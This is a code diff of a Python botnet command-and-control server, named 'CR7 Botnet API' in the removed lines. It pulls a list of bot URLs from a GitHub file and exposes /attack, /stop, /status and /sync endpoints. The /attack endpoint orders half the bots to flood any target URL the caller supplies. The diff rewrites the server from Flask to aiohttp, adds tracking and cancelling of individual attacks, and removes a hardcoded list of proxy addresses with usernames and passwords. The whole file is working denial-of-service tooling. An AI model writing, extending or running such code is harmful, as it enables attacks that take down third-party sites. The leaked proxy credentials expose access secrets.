@@ -1,44 +1,22 @@
 import asyncio
-import aiohttp
-import httpx
-import secrets
-import threading
 import random
-from flask import Flask, request, jsonify
+import secrets
+from aiohttp import web
+import httpx
 
 # --- CONFIGURATION ---
 GITHUB_BOT_URL = "https://raw.githubusercontent.com/nkarthikraja-32/bot/main/bots.txt"
 PORT = 80
-MAX_CONCURRENT = 500                 # safe for Render's free tier
-BOT_CMD_DURATION = 5                 # fixed internal duration per bot command
-
-# --- PROXIES ---
-RAW_PROXIES = [
-    "142.111.48.253:7030:kphxofnm:7kzdjrsrl0ia",
-    "23.95.150.145:6114:kphxofnm:7kzdjrsrl0ia",
-    "45.38.107.97:6014:kphxofnm:7kzdjrsrl0ia",
-    "38.154.203.95:5863:kphxofnm:7kzdjrsrl0ia",
-    "198.105.121.200:6462:kphxofnm:7kzdjrsrl0ia",
-    "198.23.243.226:6361:kphxofnm:7kzdjrsrl0ia",
-    "84.247.60.125:6095:kphxofnm:7kzdjrsrl0ia",
-    "23.27.208.120:5830:kphxofnm:7kzdjrsrl0ia",
-    "23.229.19.94:8689:kphxofnm:7kzdjrsrl0ia",
-    "2.57.20.2:6983:kphxofnm:7kzdjrsrl0ia"
-]
-
-def parse_proxy(raw):
-    parts = raw.split(":")
-    if len(parts) == 4:
-        ip, port, user, pwd = parts
-        return f"http://{user}:{pwd}@{ip}:{port}"
-    return None
-
-PROXY_LIST = [p for raw in RAW_PROXIES if (p := parse_proxy(raw)) is not None]
+MAX_CONCURRENT = 500          # simultaneous outbound requests
+BOT_CMD_DURATION = 5          # fixed duration sent to each bot
 
 # --- GLOBAL STATE ---
-BOT_ARMY = []
+BOT_ARMY = []                 # all bot URLs
+active_attacks = {}           # attack_id -> { 'task': asyncio.Task, 'stop_event': asyncio.Event, 'info': {...} }
+attack_counter = 0
 
 def sync_bot_army():
+    """Fetch bot list from GitHub."""
     global BOT_ARMY
     try:
         r = httpx.get(GITHUB_BOT_URL, timeout=10)
@@ -49,25 +27,24 @@ def sync_bot_army():
         print(f"Bot Army Sync Error: {e}")
         return 0
 
-# --- ASYNC ATTACK CORE ---
-async def hit_target(session, url, target, proxy):
-    """Send command to a single bot (fixed duration)."""
+async def hit_target(session, url, target):
+    """Send command to one bot (no proxy)."""
     params = {"url": target, "duration": BOT_CMD_DURATION}
     try:
-        async with session.get(url, params=params, proxy=proxy, timeout=5) as resp:
+        async with session.get(url, params=params, timeout=aiohttp.ClientTimeout(total=5)) as resp:
             return resp.status < 400
     except Exception:
         return False
 
-async def launch_half_wave(target):
-    """Select 50% of bots and fire exactly one wave."""
+async def attack_coroutine(attack_id, target, stop_event):
+    """Background task: select 50% of bots, fire one wave, respect stop_event."""
     if not BOT_ARMY:
-        print("ERROR: Bot army is empty.")
-        return {"status": "error", "reason": "bot_army_empty"}
+        print("ERROR: Bot army empty.")
+        active_attacks[attack_id]['info']['status'] = 'error'
+        return
 
-    half_count = max(1, len(BOT_ARMY) // 2)
-    selected = random.sample(BOT_ARMY, half_count)
-    proxies = PROXY_LIST if PROXY_LIST else [None]
+    half = max(1, len(BOT_ARMY) // 2)
+    selected = random.sample(BOT_ARMY, half)
 
     connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT, force_close=True)
     timeout = aiohttp.ClientTimeout(total=8, connect=3)
@@ -75,70 +52,110 @@ async def launch_half_wave(target):
 
     async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
         tasks = []
-        for i, bot_url in enumerate(selected):
-            proxy = proxies[i % len(proxies)]
-            async def _task(bot_url=bot_url, proxy=proxy):
+        for bot_url in selected:
+            async def _task(bot_url=bot_url):
                 async with sem:
-                    return await hit_target(session, bot_url, target, proxy)
-            tasks.append(_task())
+                    if stop_event.is_set():
+                        return False
+                    return await hit_target(session, bot_url, target)
+            tasks.append(asyncio.ensure_future(_task()))
 
+        # Wait for all, but also watch stop_event
+        done, pending = await asyncio.wait(
+            tasks, return_when=asyncio.FIRST_COMPLETED
+        )
+        # If stop requested, cancel remaining tasks
+        if stop_event.is_set():
+            for t in pending:
+                t.cancel()
+            active_attacks[attack_id]['info']['status'] = 'stopped'
+            return
+
+        # Wait for the rest if not stopped
         results = await asyncio.gather(*tasks, return_exceptions=True)
         successes = sum(1 for r in results if r is True)
 
-    return {
-        "status": "completed",
-        "bots_used": half_count,
-        "successful": successes,
-        "failed": half_count - successes,
-        "total_bots": len(BOT_ARMY)
-    }
+    active_attacks[attack_id]['info']['status'] = 'finished'
+    print(f"Attack #{attack_id} finished: {successes}/{half} bots hit")
 
-# --- FLASK APP ---
-app = Flask(__name__)
-app.config['SECRET_KEY'] = secrets.token_hex(32)
-
-@app.route('/')
-def index():
-    return jsonify({
-        "api": "CR7 Botnet API",
-        "endpoints": {
-            "/attack?target=<url>": "Launch attack using 50% of bots (fixed 5s per bot)",
-            "/sync": "Manually refresh bot list",
-            "/status": "Show current bot count"
-        }
-    })
-
-@app.route('/sync')
-def manual_sync():
-    count = sync_bot_army()
-    return jsonify({"status": "synced", "bot_count": count})
-
-@app.route('/status')
-def status():
-    return jsonify({"bot_count": len(BOT_ARMY)})
-
-@app.route('/attack')
-def attack():
-    target = request.args.get('target')
+async def launch_attack(request):
+    """GET /attack?target=..."""
+    global attack_counter
+    target = request.query.get('target')
     if not target:
-        return jsonify({"error": "Missing target parameter"}), 400
+        return web.json_response({"error": "Missing target parameter"}, status=400)
 
-    # Fire attack in background thread so API returns immediately
-    def run_attack():
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        result = loop.run_until_complete(launch_half_wave(target))
-        print(f"Attack result: {result}")
+    attack_counter += 1
+    aid = attack_counter
+    stop_event = asyncio.Event()
+    info = {
+        'id': aid,
+        'target': target,
+        'status': 'running'
+    }
+    task = asyncio.create_task(attack_coroutine(aid, target, stop_event))
+    active_attacks[aid] = {'task': task, 'stop_event': stop_event, 'info': info}
 
-    threading.Thread(target=run_attack, daemon=True).start()
-    return jsonify({
+    return web.json_response({
         "status": "attack_launched",
+        "attack_id": aid,
         "target": target,
-        "bots_available": len(BOT_ARMY),
-        "bots_to_use": max(1, len(BOT_ARMY) // 2)
+        "bots_used": max(1, len(BOT_ARMY)//2),
+        "bots_available": len(BOT_ARMY)
     })
+
+async def stop_attack(request):
+    """GET /stop?attack_id=..."""
+    aid = request.query.get('attack_id')
+    if not aid:
+        return web.json_response({"error": "Missing attack_id"}, status=400)
+    try:
+        aid = int(aid)
+    except ValueError:
+        return web.json_response({"error": "Invalid attack_id"}, status=400)
+
+    if aid not in active_attacks:
+        return web.json_response({"error": "Attack not found"}, status=404)
+
+    attack = active_attacks[aid]
+    if attack['info']['status'] != 'running':
+        return web.json_response({"error": "Attack already finished or stopped"}, status=400)
+
+    attack['stop_event'].set()
+    # Optionally cancel the task as well
+    attack['task'].cancel()
+    return web.json_response({"status": "stop_signal_sent", "attack_id": aid})
+
+async def status(request):
+    """GET /status"""
+    return web.json_response({"bot_count": len(BOT_ARMY), "active_attacks": len(active_attacks)})
+
+async def sync(request):
+    """GET /sync – manually refresh bot list"""
+    count = sync_bot_army()
+    return web.json_response({"status": "synced", "bot_count": count})
+
+async def cleanup_finished():
+    """Periodically remove finished/stopped attacks from memory."""
+    while True:
+        await asyncio.sleep(30)
+        finished = [aid for aid, a in active_attacks.items() if a['info']['status'] != 'running']
+        for aid in finished:
+            del active_attacks[aid]
+
+def create_app():
+    app = web.Application()
+    app.router.add_get('/attack', launch_attack)
+    app.router.add_get('/stop', stop_attack)
+    app.router.add_get('/status', status)
+    app.router.add_get('/sync', sync)
+    # Add cleanup task on startup
+    app.on_startup.append(lambda app: asyncio.create_task(cleanup_finished()))
+    return app
 
 if __name__ == '__main__':
+    # Initial sync
     count = sync_bot_army()
-    print(f"Bot army synced: {count} nodes.")
-    app.run(host="0.0.0.0", port=PORT)
+    print(f"Bot army synced: {count} nodes")
+    app = create_app()
+    web.run_app(app, host='0.0.0.0', port=PORT)
